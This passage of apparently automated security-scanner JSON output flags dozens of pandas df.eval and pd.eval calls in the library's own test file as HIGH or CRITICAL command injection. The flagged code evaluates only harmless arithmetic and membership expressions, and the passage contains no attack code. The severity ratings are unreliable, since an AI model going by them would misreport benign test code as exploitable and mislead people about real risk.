            "context": "\n        expected[\"c\"] = expected[\"a\"] + expected[\"b\"]\n        expected[\"d\"] = expected[\"c\"] + expected[\"b\"]\n        answer = df.eval(\n            \"\"\"\n        c = a + b\n        d = c + b\"\"\",",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1319,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "answer = df.eval(",
            "context": "\n        expected[\"a\"] = expected[\"a\"] - 1\n        expected[\"e\"] = expected[\"a\"] + 2\n        answer = df.eval(\n            \"\"\"\n        a = a - 1\n        e = a + 2\"\"\",",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1331,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(",
            "context": "        # multi-line not valid if not all assignments\n        msg = \"Multi-line expressions are only valid if all expressions contain\"\n        with pytest.raises(ValueError, match=msg):\n            df.eval(\n                \"\"\"\n            a = b + 2\n            b - 2\"\"\",",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1345,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df = df.eval(",
            "context": "\n        expected[\"c\"] = expected[\"a\"] + expected[\"b\"]\n        expected[\"d\"] = expected[\"c\"] + expected[\"b\"]\n        df = df.eval(\n            \"\"\"\n        c = a + b\n        d = c + b\"\"\",",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1355,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df = df.eval(",
            "context": "\n        expected[\"a\"] = expected[\"a\"] - 1\n        expected[\"e\"] = expected[\"a\"] + 2\n        df = df.eval(\n            \"\"\"\n        a = a - 1\n        e = a + 2\"\"\",",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1371,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "answer = df.eval(",
            "context": "        local_var = 7\n        expected[\"c\"] = expected[\"a\"] * local_var\n        expected[\"d\"] = expected[\"c\"] + local_var\n        answer = df.eval(\n            \"\"\"\n        c = a * @local_var\n        d = c + @local_var",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1391,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "answer = df.eval(",
            "context": "        expected = df.copy()\n        expected[\"c\"] = expected[\"a\"] * local_func(1, 7)\n        expected[\"d\"] = expected[\"c\"] + local_func(1, 7)\n        answer = df.eval(\n            \"\"\"\n        c = a * @local_func(1, 7)\n        d = c + @local_func(1, 7)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1411,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "answer = df.eval(",
            "context": "        expected = df.copy()\n        expected[\"c\"] = expected[\"a\"] * local_func(b=7, a=1)\n        expected[\"d\"] = expected[\"c\"] + local_func(b=7, a=1)\n        answer = df.eval(\n            \"\"\"\n        c = a * @local_func(b=7, a=1)\n        d = c + @local_func(b=7, a=1)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1441,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(\"a = 1 + 2\", target=df, inplace=True)",
            "context": "        df = {}\n        expected = {\"a\": 3}\n\n        self.eval(\"a = 1 + 2\", target=df, inplace=True)\n        tm.assert_dict_equal(df, expected)\n\n    @pytest.mark.parametrize(\"invalid_target\", [1, \"cat\", [1, 2], np.array([]), (1, 3)])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1450,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(expression, target=invalid_target, inplace=True)",
            "context": "        expression = \"a = 1 + 2\"\n\n        with pytest.raises(ValueError, match=msg):\n            self.eval(expression, target=invalid_target, inplace=True)\n\n        if hasattr(invalid_target, \"copy\"):\n            with pytest.raises(ValueError, match=msg):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1454,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(expression, target=invalid_target, inplace=False)",
            "context": "\n        if hasattr(invalid_target, \"copy\"):\n            with pytest.raises(ValueError, match=msg):\n                self.eval(expression, target=invalid_target, inplace=False)\n\n    @pytest.mark.parametrize(\"invalid_target\", [1, \"cat\", (1, 3)])\n    def test_cannot_copy_item(self, invalid_target):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1462,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(expression, target=invalid_target, inplace=False)",
            "context": "        expression = \"a = 1 + 2\"\n\n        with pytest.raises(ValueError, match=msg):\n            self.eval(expression, target=invalid_target, inplace=False)\n\n    @pytest.mark.parametrize(\"target\", [1, \"cat\", [1, 2], np.array([]), (1, 3), {1: 2}])\n    def test_inplace_no_assignment(self, target):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1468,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert self.eval(expression, target=target, inplace=False) == 3",
            "context": "    def test_inplace_no_assignment(self, target):\n        expression = \"1 + 2\"\n\n        assert self.eval(expression, target=target, inplace=False) == 3\n\n        msg = \"Cannot operate inplace if there is no assignment\"\n        with pytest.raises(ValueError, match=msg):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1472,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.eval(expression, target=target, inplace=True)",
            "context": "\n        msg = \"Cannot operate inplace if there is no assignment\"\n        with pytest.raises(ValueError, match=msg):\n            self.eval(expression, target=target, inplace=True)\n\n    def test_basic_period_index_boolean_expression(self):\n        df = DataFrame(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1480,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r = self.eval(\"df < 2\", local_dict={\"df\": df})",
            "context": "            columns=period_range(\"2020-01-01\", freq=\"D\", periods=2),\n        )\n        e = df < 2\n        r = self.eval(\"df < 2\", local_dict={\"df\": df})\n        x = df < 2\n\n        tm.assert_frame_equal(r, e)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1491,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r = self.eval(\"df[df < 2 + 3]\", local_dict={\"df\": df})",
            "context": "            np.random.default_rng(2).standard_normal((2, 2)),\n            columns=period_range(\"2020-01-01\", freq=\"D\", periods=2),\n        )\n        r = self.eval(\"df[df < 2 + 3]\", local_dict={\"df\": df})\n        e = df[df < 2 + 3]\n        tm.assert_frame_equal(r, e)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1500,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r = self.eval(\"df[df[df < 2] < 2] + df * 2\", local_dict={\"df\": df})",
            "context": "            np.random.default_rng(2).standard_normal((2, 2)),\n            columns=period_range(\"2020-01-01\", freq=\"D\", periods=2),\n        )\n        r = self.eval(\"df[df[df < 2] < 2] + df * 2\", local_dict={\"df\": df})\n        e = df[df[df < 2] < 2] + df * 2\n        tm.assert_frame_equal(r, e)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1507,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = self.eval(",
            "context": "    def test_date_boolean(self, engine, parser):\n        df = DataFrame(np.random.default_rng(2).standard_normal((5, 3)))\n        df[\"dates1\"] = date_range(\"1/1/2012\", periods=5)\n        res = self.eval(\n            \"df.dates1 < 20130101\",\n            local_dict={\"df\": df},\n            engine=engine,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1518,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"1 in [1, 2]\", engine=engine, parser=parser)",
            "context": "\n    def test_simple_in_ops(self, engine, parser):\n        if parser != \"python\":\n            res = pd.eval(\"1 in [1, 2]\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"2 in (1, 2)\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1521,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"2 in (1, 2)\", engine=engine, parser=parser)",
            "context": "            res = pd.eval(\"1 in [1, 2]\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"2 in (1, 2)\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"3 in (1, 2)\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1524,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"3 in (1, 2)\", engine=engine, parser=parser)",
            "context": "            res = pd.eval(\"2 in (1, 2)\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"3 in (1, 2)\", engine=engine, parser=parser)\n            assert not res\n\n            res = pd.eval(\"3 not in (1, 2)\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1527,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"3 not in (1, 2)\", engine=engine, parser=parser)",
            "context": "            res = pd.eval(\"3 in (1, 2)\", engine=engine, parser=parser)\n            assert not res\n\n            res = pd.eval(\"3 not in (1, 2)\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"[3] not in (1, 2)\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1530,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"[3] not in (1, 2)\", engine=engine, parser=parser)",
            "context": "            res = pd.eval(\"3 not in (1, 2)\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"[3] not in (1, 2)\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"[3] in ([3], 2)\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1533,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"[3] in ([3], 2)\", engine=engine, parser=parser)",
            "context": "            res = pd.eval(\"[3] not in (1, 2)\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"[3] in ([3], 2)\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"[[3]] in [[[3]], 2]\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1536,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"[[3]] in [[[3]], 2]\", engine=engine, parser=parser)",
            "context": "            res = pd.eval(\"[3] in ([3], 2)\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"[[3]] in [[[3]], 2]\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"(3,) in [(3,), 2]\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1539,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"(3,) in [(3,), 2]\", engine=engine, parser=parser)",
            "context": "            res = pd.eval(\"[[3]] in [[[3]], 2]\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"(3,) in [(3,), 2]\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"(3,) not in [(3,), 2]\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1542,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"(3,) not in [(3,), 2]\", engine=engine, parser=parser)",
            "context": "            res = pd.eval(\"(3,) in [(3,), 2]\", engine=engine, parser=parser)\n            assert res\n\n            res = pd.eval(\"(3,) not in [(3,), 2]\", engine=engine, parser=parser)\n            assert not res\n\n            res = pd.eval(\"[(3,)] in [[(3,)], 2]\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1545,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"[(3,)] in [[(3,)], 2]\", engine=engine, parser=parser)",
            "context": "            res = pd.eval(\"(3,) not in [(3,), 2]\", engine=engine, parser=parser)\n            assert not res\n\n            res = pd.eval(\"[(3,)] in [[(3,)], 2]\", engine=engine, parser=parser)\n            assert res\n        else:\n            msg = \"'In' nodes are not implemented\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1550,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"1 in [1, 2]\", engine=engine, parser=parser)",
            "context": "        else:\n            msg = \"'In' nodes are not implemented\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"1 in [1, 2]\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"2 in (1, 2)\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1552,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"2 in (1, 2)\", engine=engine, parser=parser)",
            "context": "            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"1 in [1, 2]\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"2 in (1, 2)\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"3 in (1, 2)\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1554,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"3 in (1, 2)\", engine=engine, parser=parser)",
            "context": "            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"2 in (1, 2)\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"3 in (1, 2)\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"[(3,)] in (1, 2, [(3,)])\", engine=engine, parser=parser)\n            msg = \"'NotIn' nodes are not implemented\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1556,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"[(3,)] in (1, 2, [(3,)])\", engine=engine, parser=parser)",
            "context": "            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"3 in (1, 2)\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"[(3,)] in (1, 2, [(3,)])\", engine=engine, parser=parser)\n            msg = \"'NotIn' nodes are not implemented\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"3 not in (1, 2)\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1559,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"3 not in (1, 2)\", engine=engine, parser=parser)",
            "context": "                pd.eval(\"[(3,)] in (1, 2, [(3,)])\", engine=engine, parser=parser)\n            msg = \"'NotIn' nodes are not implemented\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"3 not in (1, 2)\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"[3] not in (1, 2, [[3]])\", engine=engine, parser=parser)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1561,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"[3] not in (1, 2, [[3]])\", engine=engine, parser=parser)",
            "context": "            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"3 not in (1, 2)\", engine=engine, parser=parser)\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\"[3] not in (1, 2, [[3]])\", engine=engine, parser=parser)\n\n    def test_check_many_exprs(self, engine, parser):\n        a = 1  # noqa: F841",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1567,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        a = 1  # noqa: F841\n        expr = \" * \".join(\"a\" * 33)\n        expected = 1\n        res = pd.eval(expr, engine=engine, parser=parser)\n        assert res == expected\n\n    @pytest.mark.parametrize(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1586,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(",
            "context": "                msg = \"'Not' nodes are not implemented\"\n\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(\n                    expr,\n                    local_dict={\"df\": df},\n                    parser=parser,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1594,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(",
            "context": "                )\n        else:\n            # smoke-test, should not raise\n            pd.eval(\n                expr,\n                local_dict={\"df\": df},\n                parser=parser,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1608,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(ex, parser=parser, engine=engine)",
            "context": "        if parser == \"python\":\n            msg = \"cannot evaluate scalar only bool ops\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(ex, parser=parser, engine=engine)\n        else:\n            # smoke-test, should not raise\n            pd.eval(ex, parser=parser, engine=engine)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1611,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(ex, parser=parser, engine=engine)",
            "context": "                pd.eval(ex, parser=parser, engine=engine)\n        else:\n            # smoke-test, should not raise\n            pd.eval(ex, parser=parser, engine=engine)\n\n\nclass TestMath:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1615,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(self, *args, **kwargs):",
            "context": "\n\nclass TestMath:\n    def eval(self, *args, **kwargs):\n        kwargs[\"level\"] = kwargs.pop(\"level\", 0) + 1\n        return pd.eval(*args, **kwargs)\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1617,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return pd.eval(*args, **kwargs)",
            "context": "class TestMath:\n    def eval(self, *args, **kwargs):\n        kwargs[\"level\"] = kwargs.pop(\"level\", 0) + 1\n        return pd.eval(*args, **kwargs)\n\n    @pytest.mark.skipif(\n        not NUMEXPR_INSTALLED, reason=\"Unary ops only implemented for numexpr\"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1628,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "got = self.eval(expr)",
            "context": "        a = df.a\n\n        expr = f\"{fn}(a)\"\n        got = self.eval(expr)\n        with np.errstate(all=\"ignore\"):\n            expect = getattr(np, fn)(a)\n        tm.assert_series_equal(got, expect, check_names=False)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1645,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "got = self.eval(expr)",
            "context": "        b = df.b\n\n        expr = f\"{fn}(a, b)\"\n        got = self.eval(expr)\n        with np.errstate(all=\"ignore\"):\n            expect = getattr(np, fn)(a, b)\n        tm.assert_almost_equal(got, expect, check_names=False)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1657,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(",
            "context": "                \"b\": np.random.default_rng(2).standard_normal(10),\n            }\n        )\n        df.eval(\n            \"e = arctan2(sin(a), b)\",\n            engine=engine,\n            parser=parser,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1674,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"e = sin(a + b)\", engine=engine, parser=parser, inplace=True)",
            "context": "                \"b\": np.random.default_rng(2).standard_normal(10),\n            }\n        )\n        df.eval(\"e = sin(a + b)\", engine=engine, parser=parser, inplace=True)\n        got = df.e\n        expect = np.sin(df.a + df.b)\n        tm.assert_series_equal(got, expect, check_names=False)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1699,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"b = sin(a)\", engine=engine, parser=parser, inplace=True)",
            "context": "            {\"a\": np.random.default_rng(2).standard_normal(10).astype(dtype)}\n        )\n        assert df.a.dtype == dtype\n        df.eval(\"b = sin(a)\", engine=engine, parser=parser, inplace=True)\n        got = df.b\n        expect = np.sin(df.a)\n        assert expect.dtype == got.dtype",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1711,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"mysin(a)\", engine=engine, parser=parser)",
            "context": "        msg = '\"mysin\" is not a supported function'\n\n        with pytest.raises(ValueError, match=msg):\n            df.eval(\"mysin(a)\", engine=engine, parser=parser)\n\n    def test_keyword_arg(self, engine, parser):\n        df = DataFrame({\"a\": np.random.default_rng(2).standard_normal(10)})",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1718,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"sin(x=a)\", engine=engine, parser=parser)",
            "context": "        msg = 'Function \"sin\" does not support keyword arguments'\n\n        with pytest.raises(TypeError, match=msg):\n            df.eval(\"sin(x=a)\", engine=engine, parser=parser)\n\n\n_var_s = np.random.default_rng(2).standard_normal(10)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1728,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "_var_s * 2, pd.eval(e, engine=engine, parser=parser)",
            "context": "    def test_global_scope(self, engine, parser):\n        e = \"_var_s * 2\"\n        tm.assert_numpy_array_equal(\n            _var_s * 2, pd.eval(e, engine=engine, parser=parser)\n        )\n\n    def test_no_new_locals(self, engine, parser):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1734,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"x + 1\", local_dict=lcls, engine=engine, parser=parser)",
            "context": "    def test_no_new_locals(self, engine, parser):\n        x = 1\n        lcls = locals().copy()\n        pd.eval(\"x + 1\", local_dict=lcls, engine=engine, parser=parser)\n        lcls2 = locals().copy()\n        lcls2.pop(\"lcls\")\n        assert lcls == lcls2",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1742,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"x + 1\", engine=engine, parser=parser)",
            "context": "    def test_no_new_globals(self, engine, parser):\n        x = 1  # noqa: F841\n        gbls = globals().copy()\n        pd.eval(\"x + 1\", engine=engine, parser=parser)\n        gbls2 = globals().copy()\n        assert gbls == gbls2\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1751,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"x + 1\", engine=engine, parser=parser, local_dict={})",
            "context": "        x = 1  # noqa: F841\n        msg = \"name 'x' is not defined\"\n        with pytest.raises(UndefinedVariableError, match=msg):\n            pd.eval(\"x + 1\", engine=engine, parser=parser, local_dict={})\n\n    def test_empty_globals(self, engine, parser):\n        # GH 47084",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1758,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(e, engine=engine, parser=parser, global_dict={})",
            "context": "        msg = \"name '_var_s' is not defined\"\n        e = \"_var_s * 2\"\n        with pytest.raises(UndefinedVariableError, match=msg):\n            pd.eval(e, engine=engine, parser=parser, global_dict={})\n\n\n@td.skip_if_no(\"numexpr\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1765,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"x + y\", local_dict={\"x\": 1, \"y\": 2}, engine=\"asdf\")",
            "context": "def test_invalid_engine():\n    msg = \"Invalid engine 'asdf' passed\"\n    with pytest.raises(KeyError, match=msg):\n        pd.eval(\"x + y\", local_dict={\"x\": 1, \"y\": 2}, engine=\"asdf\")\n\n\n@td.skip_if_no(\"numexpr\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 1801,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
